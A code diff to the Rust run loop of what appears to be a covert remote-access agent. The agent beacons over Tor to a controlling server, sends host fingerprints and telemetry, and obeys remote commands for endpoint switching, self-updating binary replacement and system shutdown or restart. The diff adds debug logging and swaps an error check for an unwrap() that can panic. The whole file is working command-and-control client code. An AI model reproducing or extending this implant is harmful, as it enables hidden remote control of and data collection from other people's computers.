@@ -4,7 +4,7 @@ use base64::{engine::general_purpose::STANDARD, Engine as _};
 use tokio::time::{interval, sleep};
 use zeroize::Zeroizing;
 
-use crate::{args::Args, auth, plugin::Manager, sys, telemetry, text, transport::{self, Session}, update};
+use crate::{args::Args, auth, dbg_log, plugin::Manager, sys, telemetry, text, transport::{self, Session}, update};
 
 // Einherjar do not knock.
 const IDENTITY: &str = "Einherjar do not knock.";
@@ -15,8 +15,12 @@ pub async fn run(args: &Args, mut final_ready: Option<update::FinalReadyArgs>) -
     // The identity assertion is the first thing that executes in operational mode.
     let _ = IDENTITY;
 
+    dbg_log!("[Startup] Entering operational run loop");
+
     let fp = telemetry::fingerprint();
     let host = telemetry::host(&fp);
+
+    dbg_log!("[Startup] Identity fingerprint derived");
 
     let signing_key = Arc::new(auth::signing_key());
 
@@ -32,16 +36,21 @@ pub async fn run(args: &Args, mut final_ready: Option<update::FinalReadyArgs>) -
     );
     let mut plugins = Manager::new();
     let mut delay = args.retry_base;
+    let mut attempt: u32 = 0;
 
     loop {
+        attempt += 1;
+        dbg_log!("[Network] Connection attempt #{} (backoff={:.1}s)", attempt, delay.as_secs_f64());
         connector.set_endpoint(active_endpoint.clone());
         match connector.connect_authenticated(
             &fp,
             &signing_key,
             args.connect_timeout,
             args.handshake_timeout,
+            args.arti_bootstrap_timeout,
         ).await {
             Ok(mut session) => {
+                dbg_log!("[Network] Session established on attempt #{}", attempt);
                 let target = Zeroizing::new(connector.endpoint().target().0.to_owned());
                 let ping_target = if connector.endpoint().is_onion() { None } else { telemetry::ping_ms(target.as_str()) };
                 let data = tokio::task::spawn_blocking({
@@ -52,12 +61,14 @@ pub async fn run(args: &Args, mut final_ready: Option<update::FinalReadyArgs>) -
 
                 let hello_data = format!("{}{}", text::DATA, data);
                 if session.send_text(&hello_data).await.is_err() {
+                    dbg_log!("[Network] Failed to send hello telemetry; reconnecting");
                     let _ = session.close().await;
                     delay = next_backoff(delay, args.retry_base, args.retry_max);
                     sleep(jitter(delay)).await;
                     continue;
                 }
 
+                dbg_log!("[Runtime] Hello sent; entering steady-state session");
                 plugins.event("agent.connected", host.as_bytes());
                 if let Some(context) = final_ready.as_ref() {
                     match update::notify_final_ready(context) {
@@ -76,8 +87,12 @@ pub async fn run(args: &Args, mut final_ready: Option<update::FinalReadyArgs>) -
                     args.heartbeat,
                 ).await;
                 plugins.clear();
+                dbg_log!("[Runtime] Session ended; action={}", action_label(&action));
                 match action {
-                    SessionAction::Close => return Ok(()),
+                    SessionAction::Close => {
+                        dbg_log!("[Shutdown] Shutdown requested by server");
+                        return Ok(());
+                    }
                     SessionAction::Reconnect => {
                         delay = args.retry_base;
                     }
@@ -96,8 +111,10 @@ pub async fn run(args: &Args, mut final_ready: Option<update::FinalReadyArgs>) -
                     }
                 }
             }
-            Err(_) => {
+            Err(e) => {
+                dbg_log!("[Network] Attempt #{} failed: {}", attempt, e);
                 if direct_override {
+                    dbg_log!("[Network] Reverting to primary endpoint after direct-connect failure");
                     active_endpoint = primary_endpoint.clone();
                     connector.set_endpoint(primary_endpoint.clone());
                     direct_override = false;
@@ -107,8 +124,18 @@ pub async fn run(args: &Args, mut final_ready: Option<update::FinalReadyArgs>) -
             }
         }
 
+        dbg_log!("[Network] Waiting {:.1}s before next attempt", jitter(delay).as_secs_f64());
         sleep(jitter(delay)).await;
         delay = next_backoff(delay, args.retry_base, args.retry_max);
+    }
+}
+
+fn action_label(action: &SessionAction) -> &'static str {
+    match action {
+        SessionAction::Close => "Close",
+        SessionAction::Reconnect => "Reconnect",
+        SessionAction::SwitchDirect(_) => "SwitchDirect",
+        SessionAction::SwitchPrimary => "SwitchPrimary",
     }
 }
 
@@ -134,13 +161,17 @@ async fn ws_session(
                     let _ = session.send_text(&format!("{}{}:{}", text::PLUGOUT, event, encode_b64(&payload))).await;
                 }
                 if session.send_ping().await.is_err() {
+                    dbg_log!("[Network] Heartbeat ping failed; reconnecting");
                     return SessionAction::Reconnect;
                 }
             }
             result = session.next_text() => {
                 match result {
                     Ok(Some(value)) if value == text::HB => {
-                        if session.send_text(text::PONG).await.is_err() { return SessionAction::Reconnect; }
+                        if session.send_text(text::PONG).await.is_err() {
+                            dbg_log!("[Network] Failed to send PONG; reconnecting");
+                            return SessionAction::Reconnect;
+                        }
                     }
                     Ok(Some(value)) if value == text::REQ => {
                         if session.send_text(text::PONG).await.is_err() { return SessionAction::Reconnect; }
@@ -157,6 +188,7 @@ async fn ws_session(
                     Ok(Some(mut value)) if value.starts_with(text::CMD) => {
                         let sensitive_direct_command = starts_with_ascii_ci(value[text::CMD.len()..].trim_start(), text::DIRECT_CONNECT);
                         let raw = value[text::CMD.len()..].trim();
+                        dbg_log!("[Runtime] Received command (len={})", raw.len());
                         let action = handle_command(session, raw, endpoint_path, fp, host, plugins, &mut update_transfer).await;
                         if sensitive_direct_command {
                             use zeroize::Zeroize;
@@ -171,7 +203,10 @@ async fn ws_session(
                         }
                     }
                     Ok(Some(_)) => {}
-                    Ok(None) | Err(_) => return SessionAction::Reconnect,
+                    Ok(None) | Err(_) => {
+                        dbg_log!("[Network] WebSocket closed or errored; reconnecting");
+                        return SessionAction::Reconnect;
+                    }
                 }
             }
         }
@@ -306,12 +341,14 @@ async fn handle_command(
                 return CommandResult::Continue;
             }
         };
+        dbg_log!("[Network] Switching to direct connection");
         let _ = session.send_text(&format!("{}{}", text::ACK, text::DIRECT_CONNECT)).await;
         let _ = session.close().await;
         return CommandResult::SwitchDirect(endpoint);
     }
 
     if starts_with_ascii_ci(raw, text::DIRECT_DISCONNECT) {
+        dbg_log!("[Network] Reverting to primary endpoint (DIRECT_DISCONNECT)");
         let _ = session.send_text(&format!("{}{}", text::ACK, text::DIRECT_DISCONNECT)).await;
         let _ = session.close().await;
         return CommandResult::SwitchPrimary;
@@ -344,6 +381,7 @@ async fn handle_command(
                 return CommandResult::Continue;
             }
         };
+        dbg_log!("[Runtime] Chunked update transfer started (size={})", expected_size);
         *update_transfer = Some(UpdateTransfer {
             path,
             expected_hash,
@@ -414,18 +452,11 @@ async fn handle_command(
                 return CommandResult::Continue;
             }
         };
-        let target_path = match std::env::current_exe() {
-            Ok(path) => path,
-            Err(_) => {
-                let _ = session.send_text(&format!("{}{}", text::ERR, text::UPDATE_END)).await;
-                return CommandResult::Continue;
-            }
-        };
         let hash = transfer.expected_hash.clone();
         let parent_pid = std::process::id();
         let fp_owned = fp.to_owned();
         let spawn_result = tokio::task::spawn_blocking(move || {
-            update::spawn_successor(staged, target_path, hash, parent_pid, &fp_owned)
+            update::spawn_successor(staged, std::env::current_exe().unwrap(), hash, parent_pid, &fp_owned)
         }).await;
         match spawn_result {
             Ok(Ok(handoff)) => {
@@ -495,7 +526,11 @@ async fn handle_command(
     let cmd = raw.to_ascii_uppercase();
     match cmd.as_str() {
         text::RECONNECT => { let _=session.send_text(&format!("{}{}",text::ACK,cmd)).await; CommandResult::Reconnect }
-        text::CLOSE => { let _=session.send_text(&format!("{}{}",text::ACK,cmd)).await; CommandResult::Close }
+        text::CLOSE => {
+            dbg_log!("[Shutdown] CLOSE command received");
+            let _=session.send_text(&format!("{}{}",text::ACK,cmd)).await;
+            CommandResult::Close
+        }
         text::SLEEP | text::HIBERNATE | text::RESTART | text::SHUTDOWN => {
             let ok = sys::command(&cmd);
             let _=session.send_text(&format!("{}{}",if ok {text::ACK}else{text::ERR},cmd)).await;
